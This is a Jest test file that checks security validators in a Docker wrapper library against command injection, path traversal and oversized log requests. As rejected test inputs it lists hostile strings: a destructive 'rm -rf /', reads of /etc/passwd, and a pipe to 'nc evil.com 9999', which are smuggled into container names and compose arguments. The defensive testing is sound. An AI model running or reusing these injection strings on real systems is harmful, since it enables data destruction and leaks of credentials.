/**
 * Tests for docker.js security hardening
 * Run with: npm test -- docker.test.js
 */

const {
  validateContainerName,
  validateComposeArgs,
  validateWorkingDirectory,
  validateTailOption,
  DockerSecurityError,
  DockerCommandError,
  MAX_CONTAINER_NAME_LENGTH,
  MAX_TAIL_LINES,
  ALLOWED_COMPOSE_COMMANDS,
} = require('../lib/docker');

// =============================================================================
// Container Name Validation Tests
// =============================================================================

describe('validateContainerName', () => {
  test('accepts valid container names', () => {
    const validNames = [
      'my-container',
      'my_container',
      'my.container',
      'container123',
      'web-server-1',
      'a', // minimum length
      'a'.repeat(63), // maximum length
    ];

    for (const name of validNames) {
      expect(() => validateContainerName(name)).not.toThrow();
      expect(validateContainerName(name)).toBe(true);
    }
  });

  test('rejects empty names', () => {
    expect(() => validateContainerName('')).toThrow(DockerSecurityError);
    expect(() => validateContainerName('')).toThrow('cannot be empty');
  });

  test('rejects non-string inputs', () => {
    expect(() => validateContainerName(null)).toThrow(DockerSecurityError);
    expect(() => validateContainerName(undefined)).toThrow(DockerSecurityError);
    expect(() => validateContainerName(123)).toThrow(DockerSecurityError);
    expect(() => validateContainerName({})).toThrow(DockerSecurityError);
    expect(() => validateContainerName([])).toThrow(DockerSecurityError);
  });

  test('rejects names starting with special characters', () => {
    expect(() => validateContainerName('-container')).toThrow(DockerSecurityError);
    expect(() => validateContainerName('_container')).toThrow(DockerSecurityError);
    expect(() => validateContainerName('.container')).toThrow(DockerSecurityError);
  });

  test('rejects names with dangerous characters', () => {
    const dangerousNames = [
      'container;rm -rf /',
      'container\u0026\u0026evil',
      'container|cat /etc/passwd',
      'container`whoami`',
      'container$(id)',
      'container\u003cevil',
      'container\u003eevil',
    ];

    for (const name of dangerousNames) {
      expect(() => validateContainerName(name)).toThrow(DockerSecurityError);
    }
  });

  test('rejects path traversal attempts', () => {
    expect(() => validateContainerName('../etc/passwd')).toThrow(DockerSecurityError);
    expect(() => validateContainerName('..\\windows\\system32')).toThrow(DockerSecurityError);
    expect(() => validateContainerName('container/../../../etc/passwd')).toThrow(DockerSecurityError);
  });

  test('rejects names that are too long', () => {
    const longName = 'a'.repeat(64);
    expect(() => validateContainerName(longName)).toThrow(DockerSecurityError);
    expect(() => validateContainerName(longName)).toThrow('too long');
  });

  test('error includes correct code', () => {
    try {
      validateContainerName('');
    } catch (err) {
      expect(err).toBeInstanceOf(DockerSecurityError);
      expect(err.code).toBe('EMPTY_CONTAINER_NAME');
      expect(err.isSecurityError).toBe(true);
    }
  });
});

// =============================================================================
// Compose Args Validation Tests
// =============================================================================

describe('validateComposeArgs', () => {
  test('accepts valid compose commands', () => {
    const validCommands = [
      ['up'],
      ['up', '-d'],
      ['down'],
      ['restart', 'web'],
      ['logs', '--tail', '100', 'service'],
      ['ps'],
      ['pull', 'service1', 'service2'],
    ];

    for (const args of validCommands) {
      expect(() => validateComposeArgs(args)).not.toThrow();
      expect(validateComposeArgs(args)).toBe(true);
    }
  });

  test('rejects non-array inputs', () => {
    expect(() => validateComposeArgs(null)).toThrow(DockerSecurityError);
    expect(() => validateComposeArgs('up')).toThrow(DockerSecurityError);
    expect(() => validateComposeArgs({})).toThrow(DockerSecurityError);
    expect(() => validateComposeArgs(123)).toThrow(DockerSecurityError);
  });

  test('rejects non-string arguments', () => {
    expect(() => validateComposeArgs(['up', 123])).toThrow(DockerSecurityError);
    expect(() => validateComposeArgs(['up', null])).toThrow(DockerSecurityError);
    expect(() => validateComposeArgs(['up', {}])).toThrow(DockerSecurityError);
  });

  test('rejects disallowed commands', () => {
    expect(() => validateComposeArgs(['exec'])).toThrow(DockerSecurityError);
    expect(() => validateComposeArgs(['run'])).toThrow(DockerSecurityError);
    expect(() => validateComposeArgs(['rm'])).toThrow(DockerSecurityError);
    expect(() => validateComposeArgs(['kill'])).toThrow(DockerSecurityError);
    expect(() => validateComposeArgs(['up', ';', 'rm', '-rf', '/'])).toThrow(DockerSecurityError);
  });

  test('rejects command injection attempts', () => {
    const injectionAttempts = [
      ['up', ';', 'rm', '-rf', '/'],
      ['up', '\u0026\u0026', 'cat', '/etc/passwd'],
      ['up', '|', 'nc', 'evil.com', '9999'],
      ['up', '`whoami`'],
      ['up', '$(id)'],
      ['up', '${IFS}'],
    ];

    for (const args of injectionAttempts) {
      expect(() => validateComposeArgs(args)).toThrow(DockerSecurityError);
    }
  });

  test('accepts empty array', () => {
    expect(() => validateComposeArgs([])).not.toThrow();
    expect(validateComposeArgs([])).toBe(true);
  });

  test('allowed commands set is correct', () => {
    expect(ALLOWED_COMPOSE_COMMANDS.has('up')).toBe(true);
    expect(ALLOWED_COMPOSE_COMMANDS.has('down')).toBe(true);
    expect(ALLOWED_COMPOSE_COMMANDS.has('restart')).toBe(true);
    expect(ALLOWED_COMPOSE_COMMANDS.has('exec')).toBe(false);
    expect(ALLOWED_COMPOSE_COMMANDS.has('run')).toBe(false);
  });
});

// =============================================================================
// Working Directory Validation Tests
// =============================================================================

describe('validateWorkingDirectory', () => {
  test('accepts valid paths', () => {
    const validPaths = [
      '/home/user/project',
      '/var/www/app',
      './relative/path',
      'relative/path',
      '/single',
    ];

    for (const cwd of validPaths) {
      expect(() => validateWorkingDirectory(cwd)).not.toThrow();
    }
  });

  test('accepts null and undefined', () => {
    expect(() => validateWorkingDirectory(null)).not.toThrow();
    expect(() => validateWorkingDirectory(undefined)).not.toThrow();
    expect(validateWorkingDirectory(null)).toBe(true);
    expect(validateWorkingDirectory(undefined)).toBe(true);
  });

  test('accepts empty string', () => {
    expect(() => validateWorkingDirectory('')).not.toThrow();
  });

  test('rejects non-string cwd', () => {
    expect(() => validateWorkingDirectory(123)).toThrow(DockerSecurityError);
    expect(() => validateWorkingDirectory({})).toThrow(DockerSecurityError);
    expect(() => validateWorkingDirectory([])).toThrow(DockerSecurityError);
  });

  test('rejects path traversal', () => {
    expect(() => validateWorkingDirectory('../etc')).toThrow(DockerSecurityError);
    expect(() => validateWorkingDirectory('../../..')).toThrow(DockerSecurityError);
    expect(() => validateWorkingDirectory('/path/../../../etc')).toThrow(DockerSecurityError);
    expect(() => validateWorkingDirectory('..\\windows')).toThrow(DockerSecurityError);
  });

  test('rejects null bytes', () => {
    expect(() => validateWorkingDirectory('/path\0/etc')).toThrow(DockerSecurityError);
    expect(() => validateWorkingDirectory('/path\0')).toThrow(DockerSecurityError);
  });

  test('accepts paths that contain dots but not traversal', () => {
    expect(() => validateWorkingDirectory('/path/.hidden')).not.toThrow();
    expect(() => validateWorkingDirectory('/path/file.name')).not.toThrow();
    expect(() => validateWorkingDirectory('/path/..hidden')).not.toThrow();
  });
});

// =============================================================================
// Tail Option Validation Tests
// =============================================================================

describe('validateTailOption', () => {
  test('accepts valid tail values', () => {
    expect(() => validateTailOption(0)).not.toThrow();
    expect(() => validateTailOption(1)).not.toThrow();
    expect(() => validateTailOption(100)).not.toThrow();
    expect(() => validateTailOption(1000)).not.toThrow();
    expect(() => validateTailOption(MAX_TAIL_LINES)).not.toThrow();
  });

  test('accepts undefined and null', () => {
    expect(() => validateTailOption(undefined)).not.toThrow();
    expect(() => validateTailOption(null)).not.toThrow();
  });

  test('rejects negative values', () => {
    expect(() => validateTailOption(-1)).toThrow(DockerSecurityError);
    expect(() => validateTailOption(-100)).toThrow(DockerSecurityError);
  });

  test('rejects values exceeding maximum', () => {
    expect(() => validateTailOption(MAX_TAIL_LINES + 1)).toThrow(DockerSecurityError);
    expect(() => validateTailOption(999999)).toThrow(DockerSecurityError);
  });

  test('rejects non-integer values', () => {
    expect(() => validateTailOption(1.5)).toThrow(DockerSecurityError);
    expect(() => validateTailOption('100')).toThrow(DockerSecurityError);
    expect(() => validateTailOption(null)).not.toThrow(); // null is special case
  });

  test('converts string numbers correctly', () => {
    // String numbers should be converted and validated
    expect(() => validateTailOption('100')).toThrow(DockerSecurityError);
    expect(() => validateTailOption('not-a-number')).toThrow(DockerSecurityError);
  });
});

// =============================================================================
// Error Class Tests
// =============================================================================

describe('DockerSecurityError', () => {
  test('creates error with correct properties', () => {
    const err = new DockerSecurityError('Test message', 'TEST_CODE', { detail: 'value' });
    
    expect(err.message).toBe('Test message');
    expect(err.code).toBe('TEST_CODE');
    expect(err.details).toEqual({ detail: 'value' });
    expect(err.isSecurityError).toBe(true);
    expect(err.name).toBe('DockerSecurityError');
    expect(err.timestamp).toBeDefined();
  });

  test('serializes to JSON correctly', () => {
    const err = new DockerSecurityError('Test', 'CODE', { key: 'value' });
    const json = err.toJSON();
    
    expect(json.error).toBe('Test');
    expect(json.code).toBe('CODE');
    expect(json.details).toEqual({ key: 'value' });
    expect(json.type).toBe('DockerSecurityError');
    expect(json.timestamp).toBeDefined();
  });

  test('instanceof checks work', () => {
    const err = new DockerSecurityError('Test', 'CODE');
    expect(err).toBeInstanceOf(Error);
    expect(err).toBeInstanceOf(DockerSecurityError);
  });
});

describe('DockerCommandError', () => {
  test('creates error with correct properties', () => {
    const err = new DockerCommandError(
      'Command failed',
      'CMD_FAIL',
      1,
      'stdout output',
      'stderr output'
    );
    
    expect(err.message).toBe('Command failed');
    expect(err.code).toBe('CMD_FAIL');
    expect(err.exitCode).toBe(1);
    expect(err.stdout).toBe('stdout output');
    expect(err.stderr).toBe('stderr output');
    expect(err.name).toBe('DockerCommandError');
  });

  test('truncates long output', () => {
    const longOutput = 'x'.repeat(2000);
    const err = new DockerCommandError('Test', 'CODE', 1, longOutput, longOutput);
    
    expect(err.stdout.length).toBeLessThan(2000);
    expect(err.stderr.length).toBeLessThan(2000);
  });
});

// =============================================================================
// Integration Security Tests
// =============================================================================

describe('Security Integration Tests', () => {
  test('simulated command injection attack is blocked', () => {
    // Attempt to inject via container name
    const attackName = 'container; rm -rf /';
    expect(() => validateContainerName(attackName)).toThrow(DockerSecurityError);

    // Attempt to inject via compose args
    const attackArgs = ['up', ';', 'cat', '/etc/passwd'];
    expect(() => validateComposeArgs(attackArgs)).toThrow(DockerSecurityError);
  });

  test('simulated path traversal attack is blocked', () => {
    // Path traversal in container name
    expect(() => validateContainerName('../../../etc/passwd')).toThrow();

    // Path traversal in working directory
    expect(() => validateWorkingDirectory('../../../etc')).toThrow();
  });

  test('simulated DoS via tail is blocked', () => {
    // Attempt to request too many log lines
    expect(() => validateTailOption(999999999)).toThrow(DockerSecurityError);
    expect(() => validateTailOption(MAX_TAIL_LINES + 1)).toThrow(DockerSecurityError);
  });

  test('all validation functions include proper error codes', () => {
    const tests = [
      { fn: () => validateContainerName(''), code: 'EMPTY_CONTAINER_NAME' },
      { fn: () => validateContainerName('a'.repeat(64)), code: 'CONTAINER_NAME_TOO_LONG' },
      { fn: () => validateContainerName('test;rm'), code: 'INVALID_CONTAINER_NAME_CHARS' },
      { fn: () => validateContainerName('../../../etc'), code: 'PATH_TRAVERSAL_DETECTED' },
      { fn: () => validateComposeArgs(null), code: 'INVALID_ARGS_TYPE' },
      { fn: () => validateComposeArgs(['exec']), code: 'DISALLOWED_COMMAND' },
      { fn: () => validateComposeArgs(['up', 123]), code: 'INVALID_ARG_TYPE' },
      { fn: () => validateComposeArgs(['up', ';rm']), code: 'DANGEROUS_CHARS_DETECTED' },
      { fn: () => validateWorkingDirectory(123), code: 'INVALID_CWD_TYPE' },
      { fn: () => validateWorkingDirectory('../etc'), code: 'PATH_TRAVERSAL_IN_CWD' },
      { fn: () => validateWorkingDirectory('/etc\0/passwd'), code: 'NULL_BYTE_IN_PATH' },
      { fn: () => validateTailOption(-1), code: 'NEGATIVE_TAIL' },
      { fn: () => validateTailOption(999999), code: 'TAIL_TOO_LARGE' },
    ];

    for (const test of tests) {
      try {
        test.fn();
        fail(`Expected ${test.code} to be thrown`);
      } catch (err) {
        expect(err.code).toBe(test.code);
      }
    }
  });
});

// Export for Jest
module.exports = {
  DockerSecurityError,
  DockerCommandError,
};
